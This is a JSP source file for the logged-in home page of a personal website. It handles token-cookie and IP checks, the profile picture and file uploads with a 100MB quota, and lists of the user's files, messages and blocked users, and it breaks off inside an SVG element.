<%@ page import="java.io.*,java.util.*,java.sql.*" %>
<%@ page import="javax.servlet.http.*,javax.servlet.*" %>
<%@ page import="com.example.final_website.Functions" %>
<%@ page import="java.text.DateFormat" %>
<%@ page import="java.text.SimpleDateFormat" %>
<%@ page import="org.ocpsoft.prettytime.PrettyTime" %>
<%@ page import="org.ocpsoft.prettytime.units.JustNow" %>
<%@ page import="java.util.Date" %>
<%@ page import="java.text.ParseException" %>
<%@ page import="org.ocpsoft.prettytime.TimeUnit" %>
<%@ taglib uri="http://java.sun.com/jsp/jstl/core" prefix="c" %>
<%@ taglib uri="http://java.sun.com/jsp/jstl/sql" prefix="sql" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ taglib prefix="fn" uri="http://java.sun.com/jsp/jstl/functions" %>
<%@ taglib prefix="fmt" uri="http://java.sun.com/jsp/jstl/fmt" %>


<%
    response.setHeader("Cache-Control", "no-cache, no-store, must-revalidate");
    Cookie[] cookies = request.getCookies();
    if (cookies != null) {
        for (Cookie cookie : cookies) {
            if (cookie.getName().equals("token")) {
                request.setAttribute("code", cookie.getValue());
            }
            else if (cookie.getName().equals("admin_code")) {
                request.setAttribute("admin_code", cookie.getValue());
            }
        }
    }
    if (Functions.is_user_admin((String) request.getAttribute("admin_code"), response)) {
        request.setAttribute("is_admin", "1");
    }
    else {
        request.setAttribute("is_admin", "0");
    }

%>

<c:if test="${code!=null}">

    <sql:setDataSource var="db" driver="com.mysql.cj.jdbc.Driver" url="jdbc:mysql://localhost:3306/login_website"
                       user="USER" password="YOUR_PASSWORD"/>
    <sql:query var="result"
               dataSource="${db}">SELECT user_name, email, profile_picture_name FROM users WHERE token = ? AND is_verified='1';<sql:param
            value='${code}'/></sql:query>
    <c:forEach var="row" items="${result.rows}">
        <c:set var="username" value="${row.user_name}" scope="request"/>
        <c:set var="email" value="${row.email}" scope="request"/>
        <c:set var="profile_picture_name" value="${row.profile_picture_name}" scope="request"/>
    </c:forEach>
</c:if>

<c:choose>
    <c:when test="${username!=null}">
        <%
            String is_ip_valid = "0";
            String url = "jdbc:mysql://localhost:3306/login_website";
            String sql_user = "USER";
            String sql_pass = "YOUR_PASSWORD";
            Connection connection = null;
            PreparedStatement preparedStatement = null;
            ResultSet resultSet = null;

            try {
                String sql_query = "SELECT ip FROM ip_email WHERE email=? ORDER BY TIME DESC LIMIT 1";
                Class.forName("com.mysql.cj.jdbc.Driver");
                connection = DriverManager.getConnection(url, sql_user, sql_pass);
                preparedStatement = connection.prepareStatement(sql_query);
                preparedStatement.setString(1, (String) request.getAttribute("email"));

                resultSet = preparedStatement.executeQuery();

                if (resultSet.next()) {
                    if (resultSet.getString(1).equals(Functions.getClientIp(request))) {
                        is_ip_valid = "1";
                    }
                    else {
                        sql_query = "SELECT ip FROM ip_email WHERE TIME > NOW() - INTERVAL 1 MONTH AND ip = ? AND email = ?";
                        preparedStatement = connection.prepareStatement(sql_query);
                        preparedStatement.setString(1, Functions.getClientIp(request));
                        preparedStatement.setString(2, (String) request.getAttribute("email"));
                        resultSet = preparedStatement.executeQuery();

                        if (resultSet.next()) {
                            is_ip_valid = "1";
                        }
                    }
                }
            }
            catch (Exception e) {
                e.printStackTrace();
            }
            finally {
                Functions.close_sql_connection(connection, preparedStatement, resultSet);
            }
            if (is_ip_valid.equals("1")) {

                String new_token = Functions.update_token((String) request.getAttribute("code"));
                Cookie token_cookie = new Cookie("token", new_token);
                token_cookie.setHttpOnly(true);
                token_cookie.setSecure(true);
                if (Functions.is_remember_me(new_token)) {
                    token_cookie.setMaxAge(60 * 60 * 24 * 365 * 10);
                }
                request.setAttribute("code", new_token);
                response.addCookie(token_cookie);

            }
            request.setAttribute("is_ip_valid", is_ip_valid);
        %>

        <c:if test="${is_ip_valid!='1'}">
            <%
                Functions.ip_not_valid(request, response);
            %>

        </c:if>


    </c:when>
    <c:otherwise>
        <% response.sendRedirect("login.jsp");
            request.setAttribute("redirected", "redirected");
            System.out.println("redirected");
        %>
    </c:otherwise>
</c:choose>
<% if (request.getAttribute("redirected") != null) {
    return;
}%>

<html>
<head>
    <title>● Home</title>
    <link rel="icon" type="image/png" href="logo.png">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <link rel="stylesheet" href="styles/svg_animation.css"/>
    <script src="https://unpkg.com/tilt.js@1.2.1/dest/tilt.jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/cropperjs/1.5.11/cropper.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/cropperjs/1.5.11/cropper.css">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"></script>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta2/css/all.min.css">


    <link rel="stylesheet" href="styles/welcome.css">


</head>
<body id="main_frame" ondrop="drop(event)" ondragover="allowDrop(event)">


    <div class="progress" style="    background: transparent;
    z-index: 2;
    width: 100%;
    position: fixed;
    height: 0.3125rem;"><span class="progress__inner" style="width: 0;
    height: inherit;
    background-color: rgb(0, 123, 255);
    border-radius: 1rem;"></span></div>
    <script>

      window.onload = () => {
        let percentage = sessionStorage.getItem("scroll-percentage");
        document.querySelector(".progress__inner").style.width = percentage + "%"

      };

      window.addEventListener("beforeunload", () => {
        sessionStorage.setItem("scroll-percentage", ((document.documentElement.scrollTop + document.body.scrollTop) /
            (document.documentElement.scrollHeight - document.documentElement.clientHeight) * 100));
      });

      document.addEventListener('scroll', () => {
            let percentage = ((document.documentElement.scrollTop + document.body.scrollTop) /
                (document.documentElement.scrollHeight - document.documentElement.clientHeight) * 100);

            document.querySelector(".progress__inner").style.width = percentage + "%"
          },
      )
    </script>


    <nav class="navbar navbar-expand-xl
 navbar-dark bg-dark" style="
    background-color: rgb(22,22,22) !important;
">
        <a href="/" class="navbar-brand" style="font-size: 150%;">
            <img id="website_logo"
                 src="logo_transparent.png" alt="website logo">SnirDekel.com</a>
        <button class="navbar-toggler" data-toggle="collapse" data-target="#navbarMenu">
            <span class="navbar-toggler-icon"></span>
        </button>
        <div id="navbarMenu" class="navbar-collapse collapse">
            <ul class="navbar-nav">
                <li class="nav-item">
                    <a class="nav-link" href="post_comment.jsp">Write Comment <i class="fa fa-edit"></i></a>
                </li>
                <li class="nav-item">
                    <a class="nav-link" href="comment_section.jsp">Browse Comments <i
                            class="fa-solid fa-comment-dots"></i></a>
                </li>
                <li class="nav-item">
                    <a class="nav-link" href="javascript:void(0)"
                       onclick="window.location.replace('logout?token=' + encodeURIComponent(`${code}`));">Logout <i
                            class="fa-solid fa-right-from-bracket"></i></a>
                </li>
                <li class="nav-item">
                    <a class="nav-link" href="javascript:void(0)"
                       onclick="on_delete_account_button()">Delete Account <i class="fa-solid fa-trash-can"></i></a>
                </li>
                <li class="nav-item">
                    <a class="nav-link" target="_blank" href="https://github.com/Snir-Dekel">Snir's GitHub <i
                            class="fa-brands fa-github"></i></a>
                </li>
                <c:if test="${is_admin=='1'}">
                    <li class="nav-item">
                        <a class="nav-link" href="admin.jsp">Admin Panel <i class="fa-solid fa-user-gear"></i></a>
                    </li>
                </c:if>

            </ul>
        </div>
    </nav>

    <h1 class="text-primary" style="text-align: center;
    margin-bottom: -1rem;
    margin-top: 2rem;" id="files_count_h1"> Your profile

    </h1>

    <div class="container mt-5">
        <div class="row d-flex justify-content-center">
            <div class="col-md-12">
                <div class="card p-3">
                    <div class="d-flex justify-content-between align-items-center">
                        <div style="font-size:130%; width: 58rem;"
                             class="user d-flex flex-row align-items-lg-start"><img style="height: 3rem"
                                                                                    src="profile-pictures?id=${profile_picture_name}"
                                                                                    width="45"
                                                                                    class="user-img  mr-2"
                                                                                    alt="profile_picture">
                            <span><small
                                    class="font-weight-bold text-primary"><c:out
                                    value='${username}'/></small>          <br><small class="font-weight-bold"
                                                                                      style="overflow-wrap: anywhere;font-size: 100%;color: rgb(255,126,0)"><c:out
                                    value='${email}'/></small></span></div>

                    </div>
                    <div class="action d-flex mt-1" style="justify-content: flex-start; user-select: none">


                        <button class="btn btn-primary" id="select_picture_button" style="padding: 0.3rem;margin-right: 1rem;
    font-size: 120%;"
                                onclick="document.getElementById('file').click()">Choose profile
                            picture
                        </button>
                        <button class="btn btn-success" onclick="on_click_change_profile_picture(this)"
                                style="padding: 0.3rem;font-size: 120%;"
                                id="upload_photo">Upload profile picture
                        </button>

                    </div>
                </div>
            </div>
        </div>
    </div>
    <br>
    <div style="display: flex;justify-content: center;
    /* align-items: center; */">
        <br>
        <div class="pre_img">
            <div id="canvas"><img style="display: none" id="image" class="prw_img" alt=
                    "your image" src=""></div>


        </div>
        <form id="form_change_picture" action="upload-photo" method="post" enctype="multipart/form-data"
              onsubmit="return document.getElementById('image_coordinates').value !== ''">
            <input style="display: none" accept=".png, .jpg, .jpeg" id="file" type="file" name="file"
                   onchange="readURL(this, event);" onclick="fileClicked(event)">

            <input id="image_coordinates" type="hidden" name="image_coordinates">
            <input type="hidden" name="username" value="<c:out value='${username}'/>"/>
            <input type="hidden" name="token" value="${code}"/>
        </form>
    </div>

    <h3 class="text-primary container"
        style="font-weight: normal;word-wrap: break-word;padding: 1rem;box-shadow:3px 3px 13px 3px #ffffff;border-radius:1rem;width: 70rem">
        You can browse comments, post comments, send messages to other
        users and save a file by uploading it to the website!
        just drag and drop the files here or press the button to select the files!</h3>

    <c:set var="likes" value="${0}"/>
    <c:set var="comments" value="${0}"/>
    <c:set var="messages_received" value="${0}"/>
    <c:set var="messages_sent" value="${0}"/>
    <c:set var="files" value="${0}"/>

    <sql:query var="result"
               dataSource="${db}">select count(*) as 'likes' FROM comment_likes WHERE username=? and type='1'<sql:param
            value='${username}'/>
    </sql:query>

    <c:forEach var="row" items="${result.rows}">
        <c:set var="likes" value="${row.likes}"/>
    </c:forEach>


    <sql:query var="result"
               dataSource="${db}">select count(*) as 'comments' FROM comments_email WHERE username=?;<sql:param
            value='${username}'/>
    </sql:query>

    <c:forEach var="row" items="${result.rows}">
        <c:set var="comments" value="${row.comments}"/>
    </c:forEach>


    <sql:query var="result"
               dataSource="${db}">select count(*) as 'messages_received' FROM messages WHERE to_user=?;<sql:param
            value='${username}'/>
    </sql:query>

    <c:forEach var="row" items="${result.rows}">
        <c:set var="messages_received" value="${row.messages_received}"/>
    </c:forEach>


    <sql:query var="result"
               dataSource="${db}">select count(*) as 'messages_sent' FROM messages WHERE from_user=?;<sql:param
            value='${username}'/>
    </sql:query>

    <c:forEach var="row" items="${result.rows}">
        <c:set var="messages_sent" value="${row.messages_sent}"/>
    </c:forEach>


    <sql:query var="result"
               dataSource="${db}">select count(*) as 'files' FROM user_files WHERE username=?;<sql:param
            value='${username}'/>
    </sql:query>

    <c:forEach var="row" items="${result.rows}">
        <c:set var="files" value="${row.files}"/>
    </c:forEach>
    <br>
    <ul class="container" id="ul_activity">
        <li id="first_li">Activity</li>

        <li class="text-right"><span class="pull-left"><strong>Likes</strong></span> <strong>${likes}</strong></li>
        <li class="text-right"><span class="pull-left"><strong>Comments Posted</strong></span>
            <strong>${comments}</strong></li>
        <li class="text-right"><span class="pull-left"><strong>Messages sent</strong></span>
            <strong>${messages_sent}</strong></li>
        <li class="text-right"><span class="pull-left"><strong>Messages received</strong></span>
            <strong>${messages_received}</strong></li>
        <li class="text-right"><span class="pull-left"><strong>Files</strong></span> <strong>${files}</strong></li>

    </ul>


    <c:choose>
    <c:when test="${is_admin=='0'}">
    <br><br>
    <sql:query var="result"
               dataSource="${db}">SELECT 100 - SUM(file_size) AS 'space_left' FROM user_files WHERE username = ?<sql:param
            value='${username}'/>
    </sql:query>
    <c:forEach var="row" items="${result.rows}">
        <c:set var="space_left" value="${row.space_left}" scope="request"/>
    </c:forEach>

    <c:if test="${space_left==null}">
        <c:set var="space_left" value="100" scope="request"/>
    </c:if>
    <c:if test="${space_left<=0}">
        <c:set var="space_left" value="0" scope="request"/>
        <h3 id="out_of_space_h1" style="color: #e72c3e;text-align:center;margin-bottom:2rem">You are out of space!</h3>
    </c:if>

    <fmt:formatNumber var="space_left_rounded"
                      value="${space_left}"
                      maxFractionDigits="2"/>


    <c:choose>
    <c:when test="${space_left<=0}">
    <h3 id="space_left_h3" class="text-primary"
        style="font-weight: 600;word-wrap: break-word;padding: 1rem;text-align:center;display: none">

        </c:when>
        <c:otherwise>
        <h3 id="space_left_h3" class="text-primary"
            style="font-weight: 600;word-wrap: break-word;padding: 1rem;text-align:center">
            </c:otherwise>
            </c:choose>


            You have <span id="label_space_left"
                           style="color: rgb(255,126,0); font-weight: bold">${space_left_rounded}</span>
            <span
                    style="color: rgb(255,126,0); font-weight: bold">MB</span>
            left
            out of 100MB in your
            account
        </h3>
            <fmt:parseNumber var="space_left_rounded" type="number" value="${space_left_rounded}"/>
        <c:choose>
        <c:when test="${space_left_rounded>=50}">
            <c:set var="class_background" value="bg-success"/>
        </c:when>
        <c:when test="${(space_left_rounded<50) and (space_left_rounded>=20)}">
            <c:set var="class_background" value="bg-warning"/>
        </c:when>
        <c:when test="${space_left_rounded<20}">
            <c:set var="class_background" value="bg-danger"/>
        </c:when>
        </c:choose>

        <c:choose>
        <c:when test="${space_left<=0}">
        <div id="space_left_progress_bar" class="progress standup_animation d-none"

        </c:when>
        <c:otherwise>
        <div id="space_left_progress_bar" class="progress standup_animation"

        </c:otherwise>
        </c:choose>

             style="width: 32rem;
    border: solid 1px white;
    font-size: 180%;
    text-align: center;
    height: 2rem;
    margin: 1rem auto 2rem;
    background-color: rgb(31, 33, 35);">
            <div id="space_left_progress" class="progress-bar ${class_background}" role="progressbar"
                 style="width: ${space_left_rounded}%;">${space_left_rounded}MB/100MB
            </div>
        </div>
        </c:when>
        <c:otherwise>
        <span id="label_space_left" style="display: none">100</span>
        <h3 class="text-primary" style="font-weight: 400;word-wrap: break-word;padding: 1rem;text-align:center"><span
                style="font-weight: 500;
color: rgb(255,126,0);">admin activated:</span> You have infinite storage in your account</h3>
        </c:otherwise>
        </c:choose>
        <c:choose>
        <c:when test="${space_left!=0}">
        <div id="file_upload_div" style="margin-bottom: 6rem;" class="d-flex justify-content-center">


            <form style="display: inline" method="post" action="upload-file"
                  onsubmit="return !(document.getElementById('select_file_button').innerHTML==='Select files' || document.getElementById('file_input').classList.contains('is-invalid'))"
                  enctype="multipart/form-data">
                <div style="display: inline-block;position: relative">
                    <input style="margin-right: 16rem;cursor: pointer;font-size: 200%" type="file"
                           class="custom-file-input no-standup" name="file" id="file_input" onchange="sub(this)"
                           multiple required>
                    <label style="background-color: rgb(28, 32, 38);color: white;" id="select_file_button"
                           class="custom-file-label" for="file_input">Select files</label>
                    <div id="max_size_error_div" class="invalid-feedback" style="font-size: 170%;font-weight: 500;">The
                        size of the files you
                        selected is larger than your remaining storage
                    </div>
                </div>
                <button style="margin-left: 1rem;top: -1.1rem;position: relative;" class="btn btn-primary"
                        id="upload_file" type="submit" onclick="toggle_loading(this)">
                    <span id="upload_file_text_span">Upload</span><span class="no-standup" id="loading_span"></span>
                </button>


                <input type="hidden" name="username" value="<c:out value='${username}'/>"/>
                <input type="hidden" name="token" value="${code}"/>
                <c:if test="${is_admin=='1'}">
                    <input type="hidden" name="admin_code" value="${admin_code}"/>
                </c:if>
                <div id="progress_parent" class="progress"
                     style="width: 100%;margin-top: 1rem;padding: 0;height: 2rem;display: none">
                    <div id="progress_percentage" class="progress-bar progress-bar-striped progress-bar-animated"
                         role="progressbar" aria-valuenow="75" aria-valuemin="0" aria-valuemax="100"
                         style="width: 0;padding: 0;font-size: 1rem;transition-duration: 0.1s"><span
                            id="span_percentage" style="
    font-size: 170%;
">0%</span></div>
                </div>
            </form>

            <div id="max_size_error_div"></div>
        </div>
        </c:when>
        <c:otherwise>
        <div id="file_upload_div" style="display:none !important;margin-bottom: 6rem;"
             class="d-flex justify-content-center">

            <form style="display: inline" method="post" action="upload-file"
                  onsubmit="return document.getElementById('select_file_button').innerHTML!=='Select files' && document.getElementById('max_size_error') == null"
                  enctype="multipart/form-data">
                <div style="display: inline-block;position: relative">
                    <input style="margin-right: 16rem;cursor: pointer;font-size: 200%" type="file"
                           class="custom-file-input no-standup" name="file" id="file_input" onchange="sub(this)"
                           multiple required>
                    <label style="background-color: rgb(28, 32, 38);color: white;" id="select_file_button"
                           class="custom-file-label" for="file_input">Select files</label>
                    <div id="max_size_error_div" class="invalid-feedback" style="font-size: 170%;">The size of the files
                        you
                        selected is larger than your remaining storage
                    </div>
                </div>
                <button style="margin-left: 1rem;top: -1.1rem;position: relative;" class="btn btn-primary"
                        id="upload_file" type="submit" onclick="toggle_loading(this)">
                    <span id="upload_file_text_span">Upload</span><span class="no-standup" id="loading_span"></span>
                </button>

                <input type="hidden" name="username" value="<c:out value='${username}'/>"/>
                <input type="hidden" name="token" value="${code}"/>
                <div id="progress_parent" class="progress"
                     style="width: 100%;margin-top: 1rem;padding: 0;height: 2rem;display: none">
                    <div id="progress_percentage" class="progress-bar progress-bar-striped progress-bar-animated"
                         role="progressbar" aria-valuenow="75" aria-valuemin="0" aria-valuemax="100"
                         style="width: 0;padding: 0;font-size: 1rem;transition-duration: 0.1s"><span
                            id="span_percentage" style="
    font-size: 170%;
">0%</span></div>
                </div>
            </form>
            <div id="max_size_error_div"></div>
        </div>
        </c:otherwise>
        </c:choose>


        <sql:query var="result2"
                   dataSource="${db}">SELECT count(*) as 'files_number' FROM user_files WHERE username = ?<sql:param
            value='${username}'/>
        </sql:query>


        <c:forEach var="row" items="${result2.rows}">
            <c:set var="files_number" value="${row.files_number}"/>
        </c:forEach>
        <c:if test="${files_number>0}">
        <h1 class="text-primary" style="text-align: center;margin-bottom: 2rem;" id="files_count_h1">
            You have <span style="margin: 0 -1px 0 -2px;" id="files_num"><c:out value='${files_number}'/></span> files
        </h1>
        <sql:query var="result"
                   dataSource="${db}">SELECT file_name, file_size FROM user_files WHERE
        username = ? ORDER BY time DESC
            <sql:param
                    value='${username}'/>
        </sql:query>


        <div class="d-flex justify-content-center">
            <div class="col-md-11">


                <c:forEach var="row" items="${result.rows}" varStatus="loop">


                    <div id="div_${loop.index}" style=";transition-duration:0.2s" class="card p-3 files_div">


                        <div class="d-flex justify-content-between align-items-center">


                            <div style="width: 58rem;" class="user d-flex flex-row align-items-center"> <span>
                        <span id="h1_count_${loop.index}" style="
    font-weight: 500;
    display: inline;
    font-size: 150%;
    margin-right: 0.2rem;
    color: white;
">${loop.index+1}
                        </span>

                <h1 style="font-size: 150%;display:inline;color: white;position: relative;left: -0.4rem;">.</h1>


                            <small
                                    class="font-weight-bold text-primary">
                                <c:out value='${row.file_name}'/>
                            </small>
                                                   <small style="margin-left: 0.5rem;color: #ff8c07"
                                                          class="font-weight-bold">
size:

<c:choose>
                        <c:when test="${row.file_size<0.1}">
                        <c:set var="file_size_kb" value="${row.file_size*1000}"/>

                               <fmt:formatNumber var="file_size_rounded"
                                                 value="${file_size_kb}"
                                                 maxFractionDigits="2"/>


                               <c:out value='${file_size_rounded}'/>KB</span>
                                </c:when>
                                <c:otherwise>
                                    <fmt:formatNumber var="file_size_rounded"
                                                      value="${row.file_size}"
                                                      maxFractionDigits="2"/>


                                    <c:out
                                            value='${file_size_rounded}'/>MB</span>

                                </c:otherwise>
                                </c:choose>
                                </small>
                                <br><small class="font-weight-bold"></small></span></div>
                            <div class="action d-flex mt-1" style=" user-select: none">


                                <button class="btn btn-danger" id="delete_file"
                                        onclick="delete_file(`<c:out value='${row.file_name}'/>`, ${loop.index}, `
                                        <c:out
                                                value='${row.file_size}'/>`)"
                                        style="padding: 3px 5px 3px 5px;font-size: 18px;margin-right: 1rem;">Delete file
                                </button>
                                <button class="btn btn-success" id="download_file"
                                        onclick="download_file(`<c:out value='${row.file_name}'/>`)"
                                        style="padding: 3px 5px 3px 5px;font-size: 18px;margin-right: 2rem;">Download
                                    file
                                </button>

                                <input style="
    position: relative;
    transform: scale(2.5);
    top: 1.3rem;
    left: -0.7rem;
    margin-left: 1rem;
    cursor: pointer;
" onclick="update_selected_files(this.checked, 'div_${loop.index}')" id="`<c:out value='${row.file_name}'/>`"
                                       type="checkbox">

                            </div>
                        </div>
                    </div>


                </c:forEach>


                <c:choose>
                    <c:when test="${files_number>5}">
                        <div id="show_more_div" style="
       display: flex;
    align-items: center;
    flex-wrap: wrap;
    margin-top: 2rem;
"><br>
                            <button class="btn my-show" onclick="show_all()"
                                    style="padding: 5px;
    font-size: 25px;
    margin-right: 1rem;
    height: 3rem;">Show all
                            </button>
                            <button class="btn my-show" onclick="show_less()"
                                    style="    padding: 5px;
    font-size: 25px;
    height: 3rem;
    margin-right: 1rem;">Show less
                            </button>
                            <button style="height: 3rem;margin-right: 1rem;font-size: 130%;
    padding: 0.2rem;" class="btn btn-success" disabled id="download_selected_files" onclick="download_files()">
                                Download selected files
                            </button>
                            <button class="btn btn-danger" id="delete_selected_files" disabled style=" height: 3rem;margin-right: 1rem;padding: 0.2rem;
    font-size: 130%;"
                                    onclick="delete_files(get_selected_files())">
                                Delete selected files
                            </button>
                            <button id="select_deselect_button" class="btn btn-primary"
                                    onclick="select_deselect_files()"
                                    style="padding: 5px;
    height: 3rem;
    margin-right: 1rem;
    width: fit-content;
    font-size: 25px;">Select all
                            </button>
                            <h1 class="text-primary" style="display: inline;
    position: relative;
    top: 0.1rem;
    font-size: 200%;">Selected files: <span
                                    id="selected_files">0</span>
                            </h1>
                        </div>
                    </c:when>
                    <c:otherwise>
                        <div id="show_more_div" style="
       display: flex;
    align-items: center;
    flex-wrap: wrap;
    margin-top: 2rem;
"><br>
                            <button style="padding: 5px;
    height: 3rem;
    margin-right: 1rem;
    width: fit-content;
    font-size: 25px;" class="btn btn-success" disabled id="download_selected_files" onclick="download_files()">
                                Download selected files
                            </button>
                            <button class="btn btn-danger" id="delete_selected_files" disabled style=" height: 3rem;margin-right: 1rem;padding: 0.2rem;
    font-size: 130%;"
                                    onclick="delete_files(get_selected_files())">
                                Delete selected files
                            </button>
                            <button id="select_deselect_button" class="btn btn-primary"
                                    onclick="select_deselect_files()"
                                    style="padding: 5px;
    height: 3rem;
    margin-right: 1rem;
    width: fit-content;
    font-size: 25px;">Select all
                            </button>
                            <h1 class="text-primary" style="display: inline;
    position: relative;
    top: 0.1rem;
    font-size: 200%;">Selected files: <span
                                    id="selected_files">0</span>
                            </h1>
                        </div>
                    </c:otherwise>
                </c:choose>
                </c:if>
            </div>
        </div>


        <sql:query var="result"
                   dataSource="${db}">select message, from_user, time, DATE_FORMAT(time, '%d/%m/%Y') as 'date',
        TIME_FORMAT(time, '%H:%i') as 'my_date', DATE_FORMAT(time, '%S/%i/%H/%e/%c/%Y') as 'full_date', is_admin FROM
        messages WHERE to_user=? ORDER BY time DESC<sql:param
            value='${username}'/>
        </sql:query>

        <c:if test="${fn:length(result.rows)!=0}">
        <h1 class="text-primary" style="text-align: center;margin-top: 7rem;">You have ${fn:length(result.rows)} private
            messages from other users</h1>

        </c:if>

        <c:forEach var="row" items="${result.rows}" varStatus="loop">
        <sql:query var="result3"
                   dataSource="${db}">SELECT profile_picture_name FROM users WHERE user_name=?<sql:param
            value='${row.from_user}'/>
        </sql:query>


        <c:forEach var="row3" items="${result3.rows}">
            <c:set var="profile_picture_name" value="${row3.profile_picture_name}"/>
        </c:forEach>


        <div class="container mt-5" id="div_message_${loop.index}">
            <div class="row d-flex justify-content-center">
                <div class="col-md-12">
                    <div class="card p-3">
                        <div class="d-flex justify-content-between align-items-center">
                            <div style="font-size:130%; width: 57rem;"
                                 class="user d-flex flex-row align-items-lg-start"><img style="height: 3rem"
                                                                                        src="profile-pictures?id=${profile_picture_name}"
                                                                                        width="45"
                                                                                        class="user-img  mr-2"
                                                                                        alt="profile_picture">
                                <span><small
                                        class="font-weight-bold text-primary"><c:out
                                        value='${row.from_user}'/></small>         <c:if
                                        test="${row.is_admin=='1'}">
                                    <span style="color: rgb(255 238 36);font-weight: bold"> (Website Admin)</span>
                                </c:if> <br><small class="font-weight-bold"
                                                   style="overflow-wrap: anywhere;font-size: 100%"><c:out
                                        value='${row.message}'/></small></span></div>
                            <c:set var="full_date" value="${row.full_date}" scope="request"/>

                            <%

                                DateFormat sdf = new SimpleDateFormat("ss/mm/HH/dd/MM/yyyy");
                                String dateString = (String) request.getAttribute("full_date");

                                Date dateObject = null;
                                try {
                                    dateObject = sdf.parse(dateString);
                                }
                                catch (ParseException e) {
                                    e.printStackTrace();
                                }

                                PrettyTime p = new PrettyTime();
                                for (TimeUnit t : p.getUnits()) {
                                    if (t instanceof JustNow) {
                                        ((JustNow) t).setMaxQuantity(1000L * 60L);
                                    }
                                }
                                if (p.format(dateObject).equals("moments from now")) {
                                    request.setAttribute("message_date", "moments ago");
                                }
                                else {
                                    request.setAttribute("message_date", p.format(dateObject));
                                }

                            %>
                            <small data-toggle="tooltip" data-placement="top"
                                   title="${row.my_date}, ${(row.date)}" class="date">${message_date}</small>
                        </div>
                        <div class="action d-flex mt-1" style="justify-content: flex-start; user-select: none">

                            <button onclick="redirect_to_message(`<c:out value='${row.from_user}'/>`)"
                                    type="button"
                                    style="position: relative; margin-top: 0.6rem"
                                    class="btn btn-primary">Send message
                            </button>

                            <button onclick="delete_message(`<c:out
                                    value='${username}'/>`, '${row.time}', ${loop.index})" type="button"
                                    style="position: relative;margin-left: 10px;margin-top: 0.6rem"
                                    class="btn btn-danger">Delete message
                            </button>
                            <button onclick="confirm_block_user(`<c:out value='${row.from_user}'/>`, `<c:out
                                    value='${username}'/>`, ${loop.index})" type="button"
                                    style="position: relative;margin-left: 10px; margin-top: 0.6rem"
                                    class="btn btn-danger">Block user
                            </button>

                        </div>
                    </div>
                </div>
            </div>
        </div>
        </c:forEach>


        <br><br>
        <sql:query var="result"
                   dataSource="${db}">SELECT from_user FROM user_block_messages WHERE to_user = ?<sql:param
            value='${username}'/>
        </sql:query>


        <c:choose>
        <c:when test="${fn:length(result.rows)==1}">
        <h1 class="text-primary" style="text-align: center; ">You have blocked ${fn:length(result.rows)} user</h1>
        </c:when>
        <c:when test="${fn:length(result.rows)>1}">
        <h1 class="text-primary" style="text-align: center; ">You have blocked ${fn:length(result.rows)} users</h1>
        </c:when>

        </c:choose>


        <c:if test="${fn:length(result.rows)>0}">

        <div class="container mt-5" style="padding-bottom: 45px">

            <div class="row d-flex justify-content-center">
                <div class="col-md-7">


                    <c:forEach var="row" items="${result.rows}" varStatus="loop">
                    <div class="card p-3 blocked_users_div">

                        <c:choose>
                        <c:when test="${fn:length(result.rows)==loop.index+1}">
                        <div class="d-flex justify-content-between align-items-center">

                            </c:when>
                            <c:otherwise>
                            <div style="padding-bottom: 1rem" class="d-flex justify-content-between align-items-center">

                                </c:otherwise>
                                </c:choose>
                                <sql:query var="result3"
                                           dataSource="${db}">SELECT profile_picture_name FROM users WHERE user_name=?<sql:param
                                        value='${row.from_user}'/></sql:query>

                                <c:forEach var="row3" items="${result3.rows}">
                                    <c:set var="profile_picture_name" value="${row3.profile_picture_name}"/>
                                </c:forEach>

                                <div style="width: 58rem;" class="user d-flex flex-row align-items-center"><img
                                        src="profile-pictures?id=${profile_picture_name}" width="45"
                                        class="user-img mr-2"
                                        alt="profile_picture"> <span>
                            <small
                                    class="font-weight-bold text-primary">
                                <c:out value='${row.from_user}'/>
                            </small>
             <br><small class="font-weight-bold"></small></span></div>
                                <div class="action d-flex mt-1" style=" user-select: none">
                                    <button style="font-size: 110%;padding: 0.4rem 0.6rem 0.4rem 0.6rem"
                                            onclick="confirm_unblock_user(`<c:out value='${row.from_user}'/>`, `<c:out
                                                    value='${username}'/>`)" type="button"

                                            class="btn btn-success">unblock
                                    </button>


                                </div>
                            </div>


                        </div>
                        </c:forEach>


                    </div>
                </div>
            </div>
            </c:if>


            <div id="sign_div" style="height: 30rem;width: 50rem;margin: 5rem auto auto;">
                <svg
                        id="sign_element"
                        width="915"
                        height="353"
                        viewBox="0 0 915 353"
                        fill="none"
                        xmlns="http://www.w3.org/2000/svg"
                >
                    <g clip-path="url(#clip0)">
                        <g filter="url(#filter1_d)">
                            <path
                                    id="path"
